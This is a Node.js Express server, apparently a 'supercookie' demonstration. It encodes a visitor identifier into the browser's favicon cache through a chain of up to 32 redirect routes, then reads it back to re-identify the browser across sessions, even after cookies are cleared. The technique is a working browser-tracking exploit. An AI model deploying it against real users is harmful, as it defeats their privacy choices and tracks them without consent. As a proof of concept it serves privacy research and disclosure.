import express from "express";
import path from "path";
import fs from "fs";
import cookieParser from "cookie-parser";
import crypto from "crypto";
import cors from "cors";
import dotenv from "dotenv";
const generateUUID = (pattern = "xxxx-xxxx-xxxx-xxxx-xxxx", charset = "abcdefghijklmnopqrstuvwxyz0123456789") => pattern.replace(/[x]/g, () => charset[Math.floor(Math.random() * charset.length)]);
const hashNumber = (value) => crypto.createHash("MD5")
    .update(value.toString())
    .digest("hex").slice(-12).split(/(?=(?:..)*$)/)
    .join(' ').toUpperCase();
const createRoutes = (base, count) => {
    const array = [];
    for (let i = 0; i < count; i++)
        array.push(crypto.createHash("MD5")
            .update(`${base}${i.toString()}`).digest("base64")
            .replace(/(\=|\+|\/)/g, '0').substring(0, 22));
    return array;
};
class Storage {
    constructor() {
        this._path = path.join(path.resolve(), "data.json");
        this._content = {};
        if (!this.existsPersistent())
            this.createPersistent();
        this.read();
    }
    get content() {
        return this._contentProxy;
    }
    set content(data) {
        this._content = data;
        const _this = this;
        const proxy = {
            get(target, key) {
                if (typeof target[key] === 'object' && target[key] !== null)
                    return new Proxy(target[key], proxy);
                else
                    return target[key];
            },
            set(target, key, value) {
                target[key] = value;
                _this.write(_this.content);
                return true;
            }
        };
        this._contentProxy = new Proxy(this._content, proxy);
        _this.write(_this.content);
    }
    read() {
        return this.content = JSON.parse(fs.readFileSync(this._path).toString() || "{}"), this;
    }
    write(content) {
        fs.writeFileSync(this._path, JSON.stringify(content, null, '\t'));
        return this;
    }
    createPersistent() {
        this.write({});
    }
    existsPersistent() {
        return fs.existsSync(this._path);
    }
}
const STORAGE = new Storage().content;
dotenv.config();
const WEBSERVER_DOMAIN_1 = process.env["HOST_MAIN"] ?? "localhost:10080";
const WEBSERVER_DOMAIN_2 = process.env["HOST_DEMO"] ?? "localhost:10081";
const WEBSERVER_PORT_1 = +process.env["PORT_MAIN"] ?? 10080;
const WEBSERVER_PORT_2 = +process.env["PORT_DEMO"] ?? 10081;
const CACHE_IDENTIFIER = STORAGE.cacheID ?? generateUUID("xxxxxxxx", "0123456789abcdef");
const N = 32;
const FILE = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+ip1sAAAAASUVORK5CYII=";
const webserver_1 = express();
const webserver_2 = express();
const maxN = 2 ** N - 1;
webserver_1.options('*', cors());
webserver_2.options('*', cors());
console.info(`supercookie | Starting up using N=${N}, C-ID='${CACHE_IDENTIFIER}' ...`);
console.info(`supercookie | There are ${Math.max(maxN - 1 - (STORAGE.index ?? 1), 0)}/${maxN - 1} unique identifiers left.`);
let Webserver = (() => {
    class Webserver {
        static getVector(identifier) {
            const booleanVector = (identifier >>> 0).toString(2)
                .padStart(this.routes.length, '0').split('')
                .map((element) => element === '1')
                .reverse();
            const vector = new Array();
            booleanVector.forEach((value, index) => value ? vector.push(this.getRouteByIndex(index)) : void 0);
            return vector;
        }
        static getIdentifier(vector, size = vector.size) {
            return parseInt(this.routes.map((route) => vector.has(route) ? 0 : 1)
                .join('').slice(0, size).split('').reverse().join(''), 2);
        }
        static hasRoute(route) {
            return this.routes.includes(route);
        }
        static getRouteByIndex(index) {
            return this.routes[index] ?? null;
        }
        static getIndexByRoute(route) {
            return this.routes.indexOf(route) ?? null;
        }
        static getNextRoute(route) {
            const index = this.routes.indexOf(route);
            if (index === -1)
                throw "Route is not valid.";
            return this.getRouteByIndex(index + 1);
        }
        static setCookie(res, name, value, options = { httpOnly: false, expires: new Date(Date.now() + 60 * 1000) }) {
            return res.cookie(name, value, options), res;
        }
        static sendFile(res, route, options = {}, type = "html") {
            let content = fs.readFileSync(route).toString();
            Object.keys(options).sort((a, b) => b.length - a.length).forEach((key) => {
                content = content.replace(new RegExp(`\{\{${key}\}\}`, 'g'), (options[key]?.toString() || '')
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;")
                    .replace(/"/g, "&quot;")
                    .replace(/'/g, "&#039;"));
            });
            res.header({
                "Cache-Control": "private, no-cache, no-store, must-revalidate",
                "Expires": -1,
                "Pragma": "no-cache"
            });
            res.type(type);
            return res.send(content), res;
        }
    }
    Webserver.routes = createRoutes(CACHE_IDENTIFIER, N).map((value) => `${CACHE_IDENTIFIER}:${value}`);
    return Webserver;
})();
let Profile = (() => {
    class Profile {
        constructor(uid, identifier = null) {
            this._identifier = null;
            this._visitedRoutes = new Set();
            this._storageSize = -1;
            this._uid = uid;
            if (identifier !== null)
                this._identifier = identifier,
                    this._vector = Webserver.getVector(identifier);
            Profile.list.add(this);
        }
        static get(uid) {
            return this.has(uid) ?
                Array.from(this.list).filter((profile) => profile.uid === uid)?.pop() :
                null;
        }
        static has(uid) {
            return Array.from(this.list).some((profile) => profile.uid === uid);
        }
        static from(uid, identifier) {
            return !this.has(uid) ? new Profile(uid, identifier) : null;
        }
        destructor() {
            Profile.list.delete(this);
        }
        get uid() {
            return this._uid;
        }
        get vector() {
            return this._vector;
        }
        get visited() {
            return this._visitedRoutes;
        }
        get identifier() {
            return this._identifier;
        }
        getRouteByIndex(index) {
            return this.vector[index] ?? null;
        }
        _isReading() {
            return this._identifier === null;
        }
        _visitRoute(route) {
            this._visitedRoutes.add(route);
        }
        _calcIdentifier() {
            return this._identifier = Webserver.getIdentifier(this._visitedRoutes, this._storageSize), this.identifier;
        }
        _setStorageSize(size) {
            this._storageSize = size;
        }
        get storageSize() {
            return this._storageSize;
        }
    }
    Profile.list = new Set();
    return Profile;
})();
;
webserver_2.set("trust proxy", 1);
webserver_2.use(cookieParser());
webserver_2.use((req, res, next) => {
    if (new RegExp(`https?:\/\/${WEBSERVER_DOMAIN_2}`).test(req.headers.origin))
        res.setHeader("Access-Control-Allow-Origin", req.headers.origin);
    res.header("Access-Control-Allow-Methods", "GET, OPTIONS");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    return next();
});
const midSet = new Set();
const generateWriteToken = () => {
    const uuid = generateUUID();
    setTimeout(() => midSet.delete(uuid), 1000 * 60);
    return midSet.add(uuid), uuid;
};
const deleteWriteToken = (token) => midSet.delete(token);
const hasWriteToken = (token) => midSet.has(token);
webserver_2.get("/read", (_req, res) => {
    const uid = generateUUID();
    console.info(`supercookie | Visitor uid='${uid}' is known • Read`);
    const profile = Profile.from(uid);
    profile._setStorageSize(Math.floor(Math.log2(STORAGE.index ?? 1)) + 1);
    if (profile === null)
        return res.redirect("/read");
    Webserver.setCookie(res, "uid", uid);
    res.redirect(`/t/${Webserver.getRouteByIndex(0)}?f=${generateUUID()}`);
});
webserver_2.get("/write/:mid", (req, res) => {
    const mid = req.params.mid;
    if (!hasWriteToken(mid))
        return res.redirect('/');
    res.clearCookie("mid");
    deleteWriteToken(mid);
    const uid = generateUUID();
    console.info(`supercookie | Visitor uid='${uid}' is unknown • Write`, STORAGE.index);
    const profile = Profile.from(uid, STORAGE.index);
    if (profile === null)
        return res.redirect('/');
    STORAGE.index++;
    Webserver.setCookie(res, "uid", uid);
    res.redirect(`/t/${Webserver.getRouteByIndex(0)}`);
});
webserver_2.get("/t/:ref", (req, res) => {
    const referrer = req.params.ref;
    const uid = req.cookies.uid;
    const profile = Profile.get(uid);
    if (!Webserver.hasRoute(referrer) || profile === null)
        return res.redirect('/');
    const route = Webserver.getNextRoute(referrer);
    if (profile._isReading() && profile.visited.has(referrer))
        return res.redirect('/');
    let nextReferrer = null;
    const redirectCount = profile._isReading() ?
        profile.storageSize :
        Math.floor(Math.log2(profile.identifier)) + 1;
    if (route)
        nextReferrer = `t/${route}?f=${generateUUID()}`;
    if (!profile._isReading()) {
        if (Webserver.getIndexByRoute(referrer) >= redirectCount - 1)
            nextReferrer = "read";
    }
    else if (Webserver.getIndexByRoute(referrer) >= redirectCount - 1 || nextReferrer === null)
        nextReferrer = "identity";
    const bit = !profile._isReading() ? profile.vector.includes(referrer) : "{}";
    Webserver.sendFile(res, path.join(path.resolve(), "www/referrer.html"), {
        delay: profile._isReading() ? 500 : 800,
        referrer: nextReferrer,
        favicon: referrer,
        bit: bit,
        index: `${Webserver.getIndexByRoute(referrer) + 1} / ${redirectCount}`
    });
});
webserver_2.get("/identity", (req, res) => {
    const uid = req.cookies.uid;
    const profile = Profile.get(uid);
    if (profile === null)
        return res.redirect('/');
    res.clearCookie("uid");
    res.clearCookie("vid");
    const identifier = profile._calcIdentifier();
    if (identifier === maxN || profile.visited.size === 0 || identifier === 0)
        return res.redirect(`/write/${generateWriteToken()}`);
    if (identifier !== 0) {
        const identifierHash = hashNumber(identifier);
        console.info(`supercookie | Visitor successfully identified as '${identifierHash}' • (#${identifier}).`);
        Webserver.sendFile(res, path.join(path.resolve(), "www/identity.html"), {
            hash: identifierHash,
            identifier: `#${identifier}`,
            url_workwise: `${WEBSERVER_DOMAIN_1}/workwise`,
            url_main: WEBSERVER_DOMAIN_1
        });
    }
    else
        Webserver.sendFile(res, path.join(path.resolve(), "www/identity.html"), {
            hash: "AN ON YM US",
            identifier: "browser not vulnerable",
            url_workwise: `${WEBSERVER_DOMAIN_1}/workwise`,
            url_main: WEBSERVER_DOMAIN_1
        });
});
webserver_2.get(`/${CACHE_IDENTIFIER}`, (req, res) => {
    const rid = !!req.cookies.rid;
    res.clearCookie("rid");
    if (!rid)
        Webserver.sendFile(res, path.join(path.resolve(), "www/redirect.html"), {
            url_demo: WEBSERVER_DOMAIN_2
        });
    else
        Webserver.sendFile(res, path.join(path.resolve(), "www/launch.html"), {
            favicon: CACHE_IDENTIFIER
        });
});
webserver_2.get('/', (_req, res) => {
    Webserver.setCookie(res, "rid", true);
    res.clearCookie("mid");
    res.redirect(`/${CACHE_IDENTIFIER}`);
});
webserver_2.get("/l/:ref", (_req, res) => {
    console.info(`supercookie | Unknown visitor detected.`);
    Webserver.setCookie(res, "mid", generateWriteToken());
    const data = Buffer.from(FILE, "base64");
    res.writeHead(200, {
        "Cache-Control": "public, max-age=31536000",
        "Expires": new Date(Date.now() + 31536000000).toUTCString(),
        "Content-Type": "image/png",
        "Content-Length": data.length
    });
    res.end(data);
});
webserver_2.get("/i/:ref", (req, res) => {
    const data = Buffer.from(FILE, "base64");
    res.writeHead(200, {
        "Cache-Control": "public, max-age=31536000",
        "Expires": new Date(Date.now() + 31536000000).toUTCString(),
        "Content-Type": "image/png",
        "Content-Length": data.length
    });
    res.end(data);
});
webserver_2.get("/f/:ref", (req, res) => {
    const referrer = req.params.ref;
    const uid = req.cookies.uid;
    if (!Profile.has(uid) || !Webserver.hasRoute(referrer))
        return res.status(404), res.end();
    const profile = Profile.get(uid);
    if (profile._isReading()) {
        profile._visitRoute(referrer);
        console.info(`supercookie | Favicon requested by uid='${uid}' • Read `, Webserver.getIndexByRoute(referrer), "•", Array.from(profile.visited).map(route => Webserver.getIndexByRoute(route)));
        return;
    }
    if (!profile.vector.includes(referrer)) {
        console.info(`supercookie | Favicon requested by uid='${uid}' • Write`, Webserver.getIndexByRoute(referrer), "•", Array.from(profile.vector).map(route => Webserver.getIndexByRoute(route)));
        return;
    }
    const data = Buffer.from(FILE, "base64");
    res.writeHead(200, {
        "Cache-Control": "public, max-age=31536000",
        "Expires": new Date(Date.now() + 31536000000).toUTCString(),
        "Content-Type": "image/png",
        "Content-Length": data.length
    });
    res.end(data);
});
webserver_1.use("/assets", express.static(path.join(path.resolve(), "www/assets"), { index: false }));
webserver_2.use("/assets", express.static(path.join(path.resolve(), "www/assets"), { index: false }));
webserver_1.get('/', (_req, res) => {
    Webserver.sendFile(res, path.join(path.resolve(), "www/index.html"), {
        url_demo: WEBSERVER_DOMAIN_2
    });
});
webserver_1.get("/favicon.ico", (_req, res) => {
    res.sendFile(path.join(path.resolve(), "www/favicon.ico"));
});
webserver_2.get("/favicon.ico", (_req, res) => {
    res.sendFile(path.join(path.resolve(), "www/favicon.ico"));
});
webserver_1.get("/workwise", (_req, res) => {
    Webserver.sendFile(res, path.join(path.resolve(), "www/workwise.html"), {
        url_main: WEBSERVER_DOMAIN_1
    });
});
webserver_1.get("/api", (_req, res) => {
    res.type("json");
    res.status(200);
    res.send({
        index: STORAGE.index,
        cache: STORAGE.cacheID,
        bits: Math.floor(Math.log2(STORAGE.index ?? 1)) + 1,
        N: N,
        maxN: maxN
    });
});
webserver_1.get('*', (_req, res) => {
    res.redirect('/');
});
webserver_2.get('*', (req, res) => {
    Webserver.sendFile(res, path.join(path.resolve(), "www/404.html"), {
        path: decodeURIComponent(req.path),
        url_main: WEBSERVER_DOMAIN_1
    });
});
webserver_1.listen(WEBSERVER_PORT_1, () => console.info(`express-web | Webserver-1 for '${WEBSERVER_DOMAIN_1}' running on port:`, WEBSERVER_PORT_1));
webserver_2.listen(WEBSERVER_PORT_2, () => console.info(`express-web | Webserver-2 for '${WEBSERVER_DOMAIN_2}' running on port:`, WEBSERVER_PORT_2));
STORAGE.index = STORAGE.index ?? 1;
STORAGE.cacheID = CACHE_IDENTIFIER;
